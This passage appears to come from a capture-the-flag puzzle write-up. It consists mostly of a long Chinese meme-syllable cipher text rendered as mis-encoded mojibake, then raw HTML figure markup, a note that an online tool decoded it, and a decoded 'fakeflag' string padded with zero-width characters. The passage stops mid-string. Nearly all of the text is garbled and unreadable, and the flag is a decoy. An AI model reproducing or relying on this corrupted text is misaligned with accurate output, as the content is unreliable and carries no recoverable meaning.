çªé‚£æ²¡æ’¸å¤šå¥ˆå“ªä¹°å™¶å¥ˆå“ˆåŸºç±³ï¼›å—åŒ—ç»¿è±†å“ªä¹°å™¶å¥ˆå“ªå“¦å—å‰åˆ©ï¼Œæ¬§è«å­£é‡Œä¹°å™¶å¥ˆå“ªä¹°å™¶å¥ˆåº“è·¯æ›¼æ³¢ï¼Œåº“è·¯æ›¼æ³¢å“ªä¹°å™¶å¤šå¤šå‹é‚£åº“è·¯æ›¼æ³¢ã€‚å“ˆåŸºç±³å¥ˆå“ªä¹°å™¶å¥ˆå“ªä¹°å—åŒ—ç»¿è±†ï¼Ÿæ¤°å¥¶é¾™å¨œå¥ˆå“ªä¹°å“ˆåŸºç±³ï¼Œçªé‚£æ²¡æ’¸å¤šå™¶å¥ˆå“ªä¹°å¥ˆè¯ºå¨œç¾å˜ï¼Ÿé˜¿è¥¿å™¶å‹å™¶å¥ˆå“ªä¹°å™¶å¥ˆå“ªå“ˆåŸºç±³ï¼Œé˜¿è¥¿å™¶å‹ä¹°å™¶å¥ˆå“ªä¹°å¨œå¥ˆå¥ˆè¯ºå¨œç¾å˜ã€‚å¥ˆè¯ºå¨œç¾å˜å“ªä¹°åŒ—å¥ˆå“ªä¹°å™¶æ¤°å¥¶é¾™ï¼Ÿå“¦å—å‰åˆ©å¥ˆå“ªä¹°åŒ—å¥ˆè¯ºå¨œç¾å˜ï¼Œçªé‚£æ²¡æ’¸å¤šå¥ˆå“ªä¹°å™¶å¥ˆå“ªçªé‚£æ²¡æ’¸å¤šï¼Ÿé˜¿è¥¿å™¶å‹ä¹°å™¶å¥ˆå“ªä¹°å™¶å¥ˆæ¬§è«å­£é‡Œã€‚åº“è·¯æ›¼æ³¢å“ªä¹°å™¶å¥ˆå“ˆåŸºç±³ï¼Ÿé˜¿è¥¿å™¶å‹å“ªä¹°å™¶å¤šå¤šå‹é‚£é˜¿è¥¿å™¶å‹ã€‚çªé‚£æ²¡æ’¸å¤šå¥ˆå“ªä¹°åŒ—å¥ˆå“ªä¹°é˜¿è¥¿å™¶å‹ï¼›åº“è·¯æ›¼æ³¢å™¶å¥ˆå“ªä¹°å™¶çªé‚£æ²¡æ’¸å¤šã€‚å—åŒ—ç»¿è±†å¥ˆå“ªä¹°å™¶å¥ˆå“ˆåŸºç±³ï¼›æ¤°å¥¶é¾™å“ªä¹°å™¶å¥ˆå“ªä¹°å“¦å—å‰åˆ©ï¼›å—åŒ—ç»¿è±†å™¶å¥ˆå“ªä¹°å“ˆåŸºç±³ï¼›å“ˆåŸºç±³å™¶å¤šå¤šå‹é‚£å¥ˆè¯ºå¨œç¾å˜ï¼Ÿçªé‚£æ²¡æ’¸å¤šå¥ˆå“ªä¹°åŒ—å¥ˆå“¦å—å‰åˆ©ï¼Œåº“è·¯æ›¼æ³¢å“ªä¹°å¨œå¥ˆæ¤°å¥¶é¾™ã€‚å“ˆåŸºç±³å“ªä¹°å™¶å¥ˆå“ªæ¬§è«å­£é‡Œï¼Ÿæ¤°å¥¶é¾™ä¹°å™¶å¥ˆå“ªä¹°å™¶é˜¿è¥¿å™¶å‹ã€‚å“ˆåŸºç±³å¥ˆå“ªä¹°å™¶å¥ˆå¥ˆè¯ºå¨œç¾å˜ï¼Ÿæ¬§è«å­£é‡Œå“ªä¹°å™¶å¤šå¤šå‹é‚£å“¦å—å‰åˆ©ï¼Œé˜¿è¥¿å™¶å‹å¥ˆå“ªä¹°å¨œå¥ˆå“ªä¹°å“¦å—å‰åˆ©ï¼Œå—åŒ—ç»¿è±†å¨œå¥ˆå“ªä¹°å™¶å¥ˆå“ªå“ˆåŸºç±³ï¼›åº“è·¯æ›¼æ³¢ä¹°å™¶å¥ˆå“ªä¹°çªé‚£æ²¡æ’¸å¤šã€‚å“ˆåŸºç±³å™¶å¥ˆå“ªä¹°å—åŒ—ç»¿è±†ï¼›æ¤°å¥¶é¾™å™¶å¥ˆå“ªä¹°å™¶å¤šå¤šçªé‚£æ²¡æ’¸å¤šï¼Œé˜¿è¥¿å™¶å‹å‹é‚£å¥ˆå“ªä¹°æ¤°å¥¶é¾™ï¼Œæ¬§è«å­£é‡Œå¨œå¥ˆå“ªä¹°å¥ˆè¯ºå¨œç¾å˜ï¼Œé˜¿è¥¿å™¶å‹åŒ—å¥ˆå“ªä¹°å™¶å¥ˆå“ªåº“è·¯æ›¼æ³¢ã€‚åº“è·¯æ›¼æ³¢ä¹°å™¶å¥ˆå“ªä¹°å™¶å¥ˆé˜¿è¥¿å™¶å‹ï¼Ÿå“ˆåŸºç±³å“ªä¹°å™¶å¥ˆå—åŒ—ç»¿è±†ï¼Œå—åŒ—ç»¿è±†å“ªä¹°å¨œå¥ˆå“ªä¹°å“ˆåŸºç±³ï¼›å“¦å—å‰åˆ©åŒ—å¥ˆå“ªä¹°å™¶å¥ˆæ¤°å¥¶é¾™ï¼Œåº“è·¯æ›¼æ³¢å“ªä¹°åŒ—å¥ˆçªé‚£æ²¡æ’¸å¤šï¼Œé˜¿è¥¿å™¶å‹å“ªä¹°å™¶å¥ˆå“ªä¹°å¥ˆè¯ºå¨œç¾å˜ï¼›å¥ˆè¯ºå¨œç¾å˜å™¶å¥ˆå“ªä¹°å™¶å¥ˆæ¬§è«å­£é‡Œï¼Œé˜¿è¥¿å™¶å‹å“ªä¹°å™¶å¥ˆå“ªçªé‚£æ²¡æ’¸å¤šã€‚å—åŒ—ç»¿è±†ä¹°å™¶å¤šå¤šé˜¿è¥¿å™¶å‹ï¼Œçªé‚£æ²¡æ’¸å¤šå‹é‚£å¥ˆå“ªé˜¿è¥¿å™¶å‹ï¼Ÿæ¤°å¥¶é¾™ä¹°åŒ—å¥ˆå“ªå¥ˆè¯ºå¨œç¾å˜ï¼›çªé‚£æ²¡æ’¸å¤šä¹°å¨œå¥ˆå“ªä¹°å™¶å¥ˆæ¤°å¥¶é¾™ï¼Ÿå“¦å—å‰åˆ©å“ªä¹°å™¶å¥ˆé˜¿è¥¿å™¶å‹ã€‚å“ˆåŸºç±³å“ªä¹°å™¶å¥ˆå“ªçªé‚£æ²¡æ’¸å¤šï¼›åº“è·¯æ›¼æ³¢ä¹°å™¶å¥ˆå“ªä¹°å™¶å¥ˆæ¬§è«å­£é‡Œã€‚å—åŒ—ç»¿è±†å“ªä¹°åŒ—å¤šå¤šå‹é‚£çªé‚£æ²¡æ’¸å¤šï¼›æ¬§è«å­£é‡Œå¥ˆå“ªä¹°å¨œå¥ˆå“ªä¹°å¥ˆè¯ºå¨œç¾å˜ï¼›æ¤°å¥¶é¾™å™¶å¥ˆå“ªä¹°å™¶çªé‚£æ²¡æ’¸å¤šï¼Œå¥ˆè¯ºå¨œç¾å˜å¥ˆå“ªä¹°å™¶å¥ˆé˜¿è¥¿å™¶å‹ï¼›é˜¿è¥¿å™¶å‹å“ªä¹°å™¶å¥ˆå“ªä¹°å¨œé˜¿è¥¿å™¶å‹ï¼›æ¤°å¥¶é¾™å¥ˆå“ªä¹°åŒ—å¥ˆæ¬§è«å­£é‡Œã€‚å¥ˆè¯ºå¨œç¾å˜å“ªä¹°å™¶å¥ˆé˜¿è¥¿å™¶å‹ï¼Œæ¤°å¥¶é¾™å“ªä¹°å¨œå¥ˆå“ªä¹°æ¬§è«å­£é‡Œï¼Ÿåº“è·¯æ›¼æ³¢å™¶å¥ˆå“ªä¹°åº“è·¯æ›¼æ³¢ã€‚é˜¿è¥¿å™¶å‹å™¶å¥ˆå“ªä¹°å™¶çªé‚£æ²¡æ’¸å¤šï¼›çªé‚£æ²¡æ’¸å¤šå¥ˆå“ªä¹°å™¶å¥ˆå“ªä¹°å—åŒ—ç»¿è±†ï¼Ÿé˜¿è¥¿å™¶å‹å™¶å¤šå¤šå‹é‚£æ¤°å¥¶é¾™ï¼Œåº“è·¯æ›¼æ³¢å¥ˆå“ªä¹°å¨œå“ˆåŸºç±³ï¼›çªé‚£æ²¡æ’¸å¤šå¥ˆå“ªä¹°å™¶é˜¿è¥¿å™¶å‹ï¼Œåº“è·¯æ›¼æ³¢å–”é…·å¨œåˆ©æ­¥å•Šé‚£çªé‚£æ²¡æ’¸å¤šï¼Ÿå—åŒ—ç»¿è±†å‰è±†æ²¡å’•å‰è±†æ¬§è«å­£é‡Œï¼›æ¬§è«å­£é‡Œæ²¡å’•å‰è±†æ²¡å—åŒ—ç»¿è±†ï¼Ÿåº“è·¯æ›¼æ³¢å’•å‰è±†æ²¡å’•åº“è·¯æ›¼æ³¢ã€‚å“ˆåŸºç±³å‰è±†æ²¡å’•å“¦å—å‰åˆ©ï¼Ÿå“ˆåŸºç±³å¥¶å‹å¤šé‚£å‰è±†åº“è·¯æ›¼æ³¢ï¼Œåº“è·¯æ›¼æ³¢æ²¡å’•å‰è±†è€¶å’•é˜¿è¥¿å™¶å‹ï¼Œæ¤°å¥¶é¾™å‰è±†æ²¡å’•å‰è±†æ²¡çªé‚£æ²¡æ’¸å¤šï¼Ÿé˜¿è¥¿å™¶å‹å’•å‰è±†æ²¡å’•æ¬§è«å­£é‡Œã€‚å¥ˆè¯ºå¨œç¾å˜å‰è±†æ²¡å’•å‰è±†å“ˆåŸºç±³ï¼Ÿæ¬§è«å­£é‡Œæ²¡å’•å¥¶å‹å¤šé‚£å‰åº“è·¯æ›¼æ³¢ï¼›é˜¿è¥¿å™¶å‹è±†æ²¡å’•å¥¶æ¤°å¥¶é¾™ï¼›å¥ˆè¯ºå¨œç¾å˜å‹å¤šé‚£å‰å—åŒ—ç»¿è±†ï¼Œçªé‚£æ²¡æ’¸å¤šè±†æ²¡å’•å‰æ¬§è«å­£é‡Œï¼›å—åŒ—ç»¿è±†è±†æ²¡å’•å‰è±†å¥ˆè¯ºå¨œç¾å˜ã€‚åº“è·¯æ›¼æ³¢æ²¡å’•å‰è±†å¥ˆè¯ºå¨œç¾å˜ï¼Œå—åŒ—ç»¿è±†æ²¡å’•å‰è±†æ²¡å’•å‰çªé‚£æ²¡æ’¸å¤šï¼Ÿåº“è·¯æ›¼æ³¢è±†è€¶å’•å¥¶å‹å¤šé˜¿è¥¿å™¶å‹ï¼Œå“ˆåŸºç±³é‚£å‰è±†æ²¡ç±³å‰è±†çªé‚£æ²¡æ’¸å¤šï¼›å“ˆåŸºç±³æ²¡å’•å‰è±†æ²¡å’•å‰å—åŒ—ç»¿è±†ï¼Ÿå¥ˆè¯ºå¨œç¾å˜è±†æ²¡å’•å‰è±†æ²¡å¥ˆè¯ºå¨œç¾å˜ï¼›å—åŒ—ç»¿è±†å’•å‰è±†æ²¡å—åŒ—ç»¿è±†ã€‚å¥ˆè¯ºå¨œç¾å˜å’•å¥¶å‹å¤šé‚£å‰å¥ˆè¯ºå¨œç¾å˜ï¼Ÿå—åŒ—ç»¿è±†è±†æ²¡ç±³å‰æ¤°å¥¶é¾™ï¼›æ¤°å¥¶é¾™è±†æ²¡å’•å‰è±†æ²¡çªé‚£æ²¡æ’¸å¤šï¼Ÿæ¬§è«å­£é‡Œå’•å‰è±†æ²¡å’•å‰è±†åº“è·¯æ›¼æ³¢ï¼›æ¬§è«å­£é‡Œæ²¡å’•å‰è±†æ²¡å’•å—åŒ—ç»¿è±†ï¼Ÿå¥ˆè¯ºå¨œç¾å˜å‰è±†æ²¡å’•å¥¶çªé‚£æ²¡æ’¸å¤šï¼›å—åŒ—ç»¿è±†å‹å¤šé‚£å‰è±†æ²¡å’•å“ˆåŸºç±³ï¼Ÿæ¬§è«å­£é‡Œå‰è±†æ²¡ç±³å‰è±†æ¬§è«å­£é‡Œï¼›é˜¿è¥¿å™¶å‹æ²¡å’•å‰è±†å¥ˆè¯ºå¨œç¾å˜ï¼›é˜¿è¥¿å™¶å‹æ²¡å’•å‰è±†æ²¡å’•å‰æ¤°å¥¶é¾™ï¼Œå“ˆåŸºç±³è±†æ²¡å’•å‰è±†æ²¡é˜¿è¥¿å™¶å‹ï¼Ÿå—åŒ—ç»¿è±†å’•å¥¶å‹å¤šé‚£æ¤°å¥¶é¾™ã€‚æ¬§è«å­£é‡Œå‰è±†æ²¡å’•å‰è±†æ²¡åº“è·¯æ›¼æ³¢ï¼›å“ˆåŸºç±³å—å–µå­è·¯è·¯å‰é˜¿è¥¿å™¶å‹ï¼Œçªé‚£æ²¡æ’¸å¤šè±†æ²¡å’•å‰è±†å“¦å—å‰åˆ©ï¼›å—åŒ—ç»¿è±†æ²¡å’•å‰è±†é˜¿è¥¿å™¶å‹ï¼Ÿé˜¿è¥¿å™¶å‹æ²¡å’•å‰è±†æ²¡å—åŒ—ç»¿è±†ï¼›å“ˆåŸºç±³å’•å‰è±†æ²¡å’•çªé‚£æ²¡æ’¸å¤šï¼›é˜¿è¥¿å™¶å‹å¥¶å‹å¤šé‚£å‰æ¤°å¥¶é¾™ï¼›åº“è·¯æ›¼æ³¢è±†æ²¡å’•å‰è±†æ²¡ç±³é˜¿è¥¿å™¶å‹ï¼Œå¥ˆè¯ºå¨œç¾å˜å‰è±†æ²¡å’•å‰çªé‚£æ²¡æ’¸å¤šã€‚é˜¿è¥¿å™¶å‹è±†æ²¡å’•å‰çªé‚£æ²¡æ’¸å¤šï¼Œé˜¿è¥¿å™¶å‹è±†æ²¡å’•å‰è±†æ¬§è«å­£é‡Œï¼Ÿåº“è·¯æ›¼æ³¢æ²¡å’•å‰è±†æ²¡çªé‚£æ²¡æ’¸å¤šï¼Œåº“è·¯æ›¼æ³¢å’•å‰è±†è€¶å’•å¥¶å‹çªé‚£æ²¡æ’¸å¤šï¼Ÿå“¦å—å‰åˆ©å¤šé‚£å‰è±†æ²¡ç±³é˜¿è¥¿å™¶å‹ã€‚å“ˆåŸºç±³å‰è±†æ²¡å’•å‰æ¬§è«å­£é‡Œï¼›å—åŒ—ç»¿è±†è±†æ²¡å’•å‰æ¬§è«å­£é‡Œã€‚å—åŒ—ç»¿è±†è±†æ²¡å’•å‰è±†æ²¡å’•å—åŒ—ç»¿è±†ï¼Ÿæ¤°å¥¶é¾™å‰è±†æ²¡ç±³å‰è±†æ¤°å¥¶é¾™ï¼›åº“è·¯æ›¼æ³¢è€¶å’•å‰è±†æ²¡é˜¿è¥¿å™¶å‹ï¼Ÿæ¬§è«å­£é‡Œå’•å‰è±†æ²¡ç±³å—åŒ—ç»¿è±†ï¼›å—åŒ—ç»¿è±†å‰è±†æ²¡å’•å‰è±†æ²¡å“ˆåŸºç±³ï¼›å“¦å—å‰åˆ©å’•å‰è±†æ²¡å’•å‰å¥ˆè¯ºå¨œç¾å˜ï¼Ÿçªé‚£æ²¡æ’¸å¤šè±†æ²¡å’•å‰è±†åº“è·¯æ›¼æ³¢ï¼Œåº“è·¯æ›¼æ³¢æ²¡å’•å¥¶å‹å¤šé‚£å‰é˜¿è¥¿å™¶å‹ã€‚çªé‚£æ²¡æ’¸å¤šè±†æ²¡å’•å‰è±†åº“è·¯æ›¼æ³¢ï¼Ÿé˜¿è¥¿å™¶å‹æ²¡è¥¿ä¸€å¥ˆå“ªä¹°å™¶é˜¿è¥¿å™¶å‹ï¼›å“¦å—å‰åˆ©å¥ˆå“ªä¹°å™¶å“¦å—å‰åˆ©ï¼›æ¤°å¥¶é¾™å¥ˆå“ªä¹°å™¶å¥ˆå—åŒ—ç»¿è±†ï¼Œåº“è·¯æ›¼æ³¢å“ªä¹°å™¶å¥ˆå“ªä¹°å¨œåº“è·¯æ›¼æ³¢ï¼Œå“ˆåŸºç±³å¥ˆå“ªä¹°åŒ—å¥ˆå“ªä¹°çªé‚£æ²¡æ’¸å¤šã€‚æ¬§è«å­£é‡Œå™¶å¥ˆå“ªä¹°åŒ—å¥ˆå“ˆåŸºç±³ï¼Œæ¤°å¥¶é¾™å“ªä¹°å™¶å¥ˆåº“è·¯æ›¼æ³¢ï¼Ÿå—åŒ—ç»¿è±†å“ªä¹°å™¶å¥ˆæ¬§è«å­£é‡Œï¼›å“ˆåŸºç±³å“ªä¹°å™¶å¥ˆæ¤°å¥¶é¾™ï¼Œå¥ˆè¯ºå¨œç¾å˜å“ªä¹°å™¶å¥ˆå“ªå—åŒ—ç»¿è±†ï¼Œåº“è·¯æ›¼æ³¢ä¹°å¨œå¥ˆå“ªå“¦å—å‰åˆ©ï¼Ÿé˜¿è¥¿å™¶å‹ä¹°åŒ—å¥ˆå“ªä¹°å¨œå¥ˆåº“è·¯æ›¼æ³¢ã€‚æ¬§è«å­£é‡Œå“ªä¹°å™¶å¥ˆæ¬§è«å­£é‡Œï¼Œåº“è·¯æ›¼æ³¢å“ªä¹°å™¶å¥ˆå“ªä¹°æ¬§è«å­£é‡Œï¼Ÿåº“è·¯æ›¼æ³¢å™¶å¥ˆå“ªä¹°å™¶å¥ˆçªé‚£æ²¡æ’¸å¤šï¼›é˜¿è¥¿å™¶å‹å“ªä¹°å™¶å¥ˆé˜¿è¥¿å™¶å‹ï¼›çªé‚£æ²¡æ’¸å¤šå“ªä¹°å™¶å¥ˆå“ªä¹°åŒ—å—åŒ—ç»¿è±†ã€‚åº“è·¯æ›¼æ³¢å¤šå¤šå‹é‚£æ¬§è«å­£é‡Œï¼Ÿæ¬§è«å­£é‡Œå¥ˆå“ªä¹°å¨œå¥ˆå“ªå“¦å—å‰åˆ©ï¼›å“ˆåŸºç±³ä¹°å™¶å¥ˆå“ªä¹°å™¶å¥ˆåº“è·¯æ›¼æ³¢ï¼Œåº“è·¯æ›¼æ³¢å“ªä¹°å™¶å¥ˆåº“è·¯æ›¼æ³¢ï¼Ÿå¥ˆè¯ºå¨œç¾å˜å“ªä¹°å™¶å¥ˆå“ªé˜¿è¥¿å™¶å‹ï¼Œå—åŒ—ç»¿è±†ä¹°å™¶å¤šå¤šå‹åº“è·¯æ›¼æ³¢ï¼›å—åŒ—ç»¿è±†é‚£å¥ˆå“ªä¹°å¨œå¥ˆåº“è·¯æ›¼æ³¢ï¼Œåº“è·¯æ›¼æ³¢å“ªä¹°åŒ—å¥ˆå“ªæ¤°å¥¶é¾™ï¼Œæ¬§è«å­£é‡Œä¹°å™¶å¥ˆå“ªä¹°åº“è·¯æ›¼æ³¢ã€‚çªé‚£æ²¡æ’¸å¤šå™¶å¥ˆå“ªä¹°å™¶çªé‚£æ²¡æ’¸å¤šï¼Œå“ˆåŸºç±³å¥ˆå“ªä¹°å™¶é˜¿è¥¿å™¶å‹ã€‚å—åŒ—ç»¿è±†å¥ˆå“ªä¹°å™¶å¤šæ¤°å¥¶é¾™ï¼Ÿå“ˆåŸºç±³å¤šå‹é‚£å¥ˆå“ªé˜¿è¥¿å™¶å‹ï¼›åº“è·¯æ›¼æ³¢ä¹°å¨œå¥ˆå“ªä¹°æ¬§è«å­£é‡Œï¼Ÿåº“è·¯æ›¼æ³¢å¨œå¥ˆå“ªä¹°å™¶å¥ˆæ¬§è«å­£é‡Œï¼›å“ˆåŸºç±³å“ªä¹°å™¶å¥ˆå“ªæ¤°å¥¶é¾™ã€‚çªé‚£æ²¡æ’¸å¤šä¹°å™¶å¥ˆå“ªå¥ˆè¯ºå¨œç¾å˜ï¼›æ¤°å¥¶é¾™ä¹°å™¶å¥ˆå“ªä¹°åº“è·¯æ›¼æ³¢ï¼Œé˜¿è¥¿å™¶å‹å¨œå¥ˆå“ªä¹°åŒ—æ¤°å¥¶é¾™ã€‚å¥ˆè¯ºå¨œç¾å˜å¥ˆå“ªä¹°å™¶å¥ˆå“ˆåŸºç±³ï¼›çªé‚£æ²¡æ’¸å¤šå“ªä¹°åŒ—å¥ˆå“ªå“ˆåŸºç±³ã€‚å¥ˆè¯ºå¨œç¾å˜ä¹°å™¶å¥ˆå“ªä¹°å™¶çªé‚£æ²¡æ’¸å¤šï¼Ÿå—åŒ—ç»¿è±†å¥ˆå“ªä¹°å™¶æ¬§è«å­£é‡Œï¼Œåº“è·¯æ›¼æ³¢å¥ˆå“ªä¹°å™¶å¥ˆå“ªä¹°åº“è·¯æ›¼æ³¢ã€‚å—åŒ—ç»¿è±†å¨œå¥ˆå“ªä¹°å—åŒ—ç»¿è±†ï¼›æ¬§è«å­£é‡ŒåŒ—å¥ˆå“ªä¹°å¨œå¥ˆå“¦å—å‰åˆ©ã€‚å“ˆåŸºç±³å“ªä¹°å¨œå­çªé‚£æ²¡æ’¸å¤šï¼›å—åŒ—ç»¿è±†é…·æ³¢åˆ©å­æ’¸å¨œå“ªå“ˆåŸºç±³ï¼Ÿå“ˆåŸºç±³å“ˆé‡Œæ¤°è·¯é˜¿è¥¿å™¶å‹ï¼Œé˜¿è¥¿å™¶å‹å¥ˆå“ªä¹°å™¶å¥ˆå“ªå“ˆåŸºç±³ã€‚å“ˆåŸºç±³ä¹°å™¶å¥ˆå“ªä¹°å™¶åº“è·¯æ›¼æ³¢ï¼Ÿæ¬§è«å­£é‡Œå¥ˆå“ªä¹°å™¶å¥ˆå“ªå—åŒ—ç»¿è±†ï¼Œå¥ˆè¯ºå¨œç¾å˜ä¹°å™¶å¤šå¤šæ¤°å¥¶é¾™ï¼›é˜¿è¥¿å™¶å‹å‹é‚£å¥ˆå“ªåº“è·¯æ›¼æ³¢ï¼›åº“è·¯æ›¼æ³¢ä¹°å™¶å¤šå¤šå‹é‚£å¥ˆåº“è·¯æ›¼æ³¢ï¼›å“¦å—å‰åˆ©å“ªä¹°å™¶å¥ˆå“ªä¹°å“¦å—å‰åˆ©ã€‚æ¤°å¥¶é¾™å™¶å¥ˆå“ªä¹°å™¶å¥ˆçªé‚£æ²¡æ’¸å¤šï¼Œé˜¿è¥¿å™¶å‹å“ªä¹°å™¶å¥ˆå“ªä¹°å™¶æ¬§è«å­£é‡Œï¼Œåº“è·¯æ›¼æ³¢å¤šå¤šå‹é‚£å¥ˆåº“è·¯æ›¼æ³¢ï¼›çªé‚£æ²¡æ’¸å¤šå“ªä¹°å™¶å¤šå¤šå‹é‚£å“ˆåŸºç±³ï¼Œçªé‚£æ²¡æ’¸å¤šå–”ç±³å“¦å•Šå‘€ç ¸å¥ˆè¯ºå¨œç¾å˜ï¼›æ¤°å¥¶é¾™æ›¼å‰è±†æ²¡å’•å—åŒ—ç»¿è±†ï¼›åº“è·¯æ›¼æ³¢å‰è±†æ²¡å’•å‰è±†æ²¡é˜¿è¥¿å™¶å‹ï¼Ÿå“¦å—å‰åˆ©å’•å‰è±†æ²¡å’•å‰å“¦å—å‰åˆ©ï¼›åº“è·¯æ›¼æ³¢è±†æ²¡å’•å¥¶å‹åº“è·¯æ›¼æ³¢ã€‚åº“è·¯æ›¼æ³¢å¤šé‚£å‰è±†å—åŒ—ç»¿è±†ï¼Ÿå¥ˆè¯ºå¨œç¾å˜æ²¡ç±³å‰è±†åº“è·¯æ›¼æ³¢ï¼›å“¦å—å‰åˆ©è€¶å—ä¸€å¥ˆå“ªä¹°å¥ˆè¯ºå¨œç¾å˜ã€‚æ¤°å¥¶é¾™å™¶å¥ˆå“ªä¹°å™¶å¥ˆé˜¿è¥¿å™¶å‹ï¼Ÿå“ˆåŸºç±³å“ªä¹°å™¶å¥ˆå“ªä¹°å™¶çªé‚£æ²¡æ’¸å¤šã€‚å—åŒ—ç»¿è±†å¥ˆå“ªä¹°å™¶é˜¿è¥¿å™¶å‹ï¼›çªé‚£æ²¡æ’¸å¤šå¤šå¤šå‹é‚£é˜¿è¥¿å™¶å‹ï¼Œé˜¿è¥¿å™¶å‹å¥ˆå“ªä¹°åŒ—å¥ˆé˜¿è¥¿å™¶å‹ï¼Œæ¬§è«å­£é‡Œå“ªä¹°å™¶å¥ˆå“ªä¹°å™¶å“ˆåŸºç±³ã€‚å“ˆåŸºç±³å¥ˆå“ªä¹°å™¶å¥ˆè¯ºå¨œç¾å˜ï¼Ÿå“ˆåŸºç±³å¥ˆå“ªä¹°å™¶åº“è·¯æ›¼æ³¢ã€‚å—åŒ—ç»¿è±†å¥ˆå“ªä¹°å™¶å¥ˆå“ªé˜¿è¥¿å™¶å‹ï¼Œå¥ˆè¯ºå¨œç¾å˜ä¹°å™¶å¤šå¤šå‹é‚£æ¬§è«å­£é‡Œï¼›å—åŒ—ç»¿è±†å¥ˆå“ªä¹°å™¶å“ˆåŸºç±³ï¼Œçªé‚£æ²¡æ’¸å¤šå¥ˆå“ªä¹°åŒ—å¥ˆå“ªä¹°å—åŒ—ç»¿è±†ï¼Œæ¬§è«å­£é‡Œå™¶å¥ˆå“ªä¹°å¥ˆè¯ºå¨œç¾å˜ï¼Ÿå“¦å—å‰åˆ©å™¶å¥ˆå“ªä¹°å“ˆåŸºç±³ï¼›å—åŒ—ç»¿è±†å™¶å¥ˆå“ªä¹°å—åŒ—ç»¿è±†ï¼›çªé‚£æ²¡æ’¸å¤šå™¶å¥ˆå“ªä¹°å¨œå¥ˆå“ªæ¤°å¥¶é¾™ï¼Œæ¬§è«å­£é‡Œä¹°åŒ—å¥ˆå“ªä¹°å™¶é˜¿è¥¿å™¶å‹ï¼Œåº“è·¯æ›¼æ³¢å¤šå¤šå‹é‚£å¥ˆå“ªä¹°å“ˆåŸºç±³ï¼›å“ˆåŸºç±³å™¶å¥ˆå“ªä¹°å™¶çªé‚£æ²¡æ’¸å¤šï¼Ÿæ¬§è«å­£é‡Œå¥ˆå“ªä¹°å™¶å¥ˆå“ªä¹°å“¦å—å‰åˆ©ã€‚é˜¿è¥¿å™¶å‹å™¶å¥ˆå“ªä¹°å™¶å¤šå“¦å—å‰åˆ©ï¼Œé˜¿è¥¿å™¶å‹å¤šå‹é‚£å¥ˆå“ªä¹°é˜¿è¥¿å™¶å‹ï¼Œå“ˆåŸºç±³åŒ—å¥ˆå“ªä¹°å—åŒ—ç»¿è±†ï¼Œå—åŒ—ç»¿è±†å™¶å¥ˆå“ªä¹°å™¶å¥ˆé˜¿è¥¿å™¶å‹ï¼Œæ¬§è«å­£é‡Œå“ªä¹°å™¶å¥ˆå“¦å—å‰åˆ©ã€‚æ¤°å¥¶é¾™å“ªä¹°å™¶å¥ˆå“ˆåŸºç±³ï¼Œåº“è·¯æ›¼æ³¢å“ªä¹°å™¶å¥ˆçªé‚£æ²¡æ’¸å¤šï¼Œå¥ˆè¯ºå¨œç¾å˜å“ªä¹°å™¶å¤šçªé‚£æ²¡æ’¸å¤šï¼Œæ¤°å¥¶é¾™å¤šå‹é‚£å¥ˆå“ªä¹°å™¶å—åŒ—ç»¿è±†ï¼Œé˜¿è¥¿å™¶å‹å¥ˆå“ªä¹°åŒ—å¥ˆå“ˆåŸºç±³ï¼›å“ˆåŸºç±³å“ªä¹°å™¶å¥ˆå“ªå¥ˆè¯ºå¨œç¾å˜ï¼Œå“¦å—å‰åˆ©ä¹°å™¶å¥ˆå“ªä¹°å™¶å¥ˆé˜¿è¥¿å™¶å‹ï¼Œçªé‚£æ²¡æ’¸å¤šå“ªä¹°å™¶å¥ˆå“ªé˜¿è¥¿å™¶å‹ã€‚çªé‚£æ²¡æ’¸å¤šä¹°å¨œå¤šå¤šæ¤°å¥¶é¾™ï¼›æ¤°å¥¶é¾™å‹é‚£å¤šå¤šå‹å¥ˆè¯ºå¨œç¾å˜ï¼›é˜¿è¥¿å™¶å‹é‚£å¥ˆå“ªä¹°å¨œå—åŒ—ç»¿è±†ã€‚å“¦å—å‰åˆ©è‡ªç±³å“¦å•Šå—åŒ—ç»¿è±†ï¼›å¥ˆè¯ºå¨œç¾å˜å—é…·åŸºå‹æ­¥é…·æ¬§è«å­£é‡Œï¼›å¥ˆè¯ºå¨œç¾å˜é©¬ç¾å‹å–”å¥ˆè¯ºå¨œç¾å˜ï¼›çªé‚£æ²¡æ’¸å¤šè¯ºå“ªå‘€å–”å–µæ¬§è«å­£é‡Œï¼›æ¬§è«å­£é‡Œå“©æ¤°å¥¶é¾™ã€‚</span><br></pre></td></tr></table></figure>

<p>ç”¨<a target="_blank" rel="noopener" href="https://lhlnb.top/hajimi/base64%E8%A7%A3%E7%A0%81%E5%BE%97%E5%88%B0">https://lhlnb.top/hajimi/base64è§£ç å¾—åˆ°</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">â€Œâ€Œâ€Œâ€Œâ€â€¬ï»¿â€â€Œâ€Œâ€Œâ€Œâ€â€¬ï»¿ï»¿fakeflagâ€Œâ€Œâ€Œâ€Œâ€â€¬â€â€â€Œâ€Œâ€Œâ€Œâ€â€¬â€Œï»¿â€Œâ€Œâ€Œâ€Œâ€ï»¿â€â€Œâ€Œâ€Œâ€Œâ€Œâ€â€¬â€â€¬&#123;â€Œâ€Œâ€Œâ€Œâ€ï»¿â€¬ï»¿youâ€Œâ€Œâ€Œâ€Œâ€Œï»¿â€Œâ€â€Œâ€Œâ€Œâ€Œâ€â€¬â€Œâ€¬â€Œâ€Œâ€Œâ€Œâ€Œï»¿â€¬â€Œâ€Œâ€Œâ€Œâ€Œâ€Œï»¿â€¬â€â€Œâ€Œâ€Œâ€Œâ€Œï»¿â€â€â€Œâ€Œâ€Œâ€Œâ€Œï»¿â€â€¬â€Œâ€Œâ€Œâ€Œâ€â€¬â€Œâ€¬â€Œâ€Œâ€Œâ€Œâ€Œï»¿â€¬â€â€Œâ€Œâ€Œâ€Œâ€Œâ€¬ï»¿â€â€Œâ€Œâ€Œâ€Œâ€â€¬â€Œâ€â€Œâ€Œâ€Œâ€Œâ€Œï»¿â€â€Œ_can_â€Œâ€Œâ€Œâ€Œâ€Œï»¿â€Œâ€¬â€Œâ€Œâ€Œâ€Œâ€Œï»¿â€Œï»¿â€Œâ€Œâ€Œâ€Œâ€Œâ€¬ï»¿â€â€Œâ€Œâ€Œâ€Œâ€Œï»¿â€â€Œâ€Œâ€Œâ€Œâ€Œâ€Œï»¿â€Œâ€â€Œâ€Œâ€Œâ€Œâ€Œï»¿â€Œâ€Œtryâ€Œâ€Œâ€Œâ€Œâ€Œï»¿â€Œâ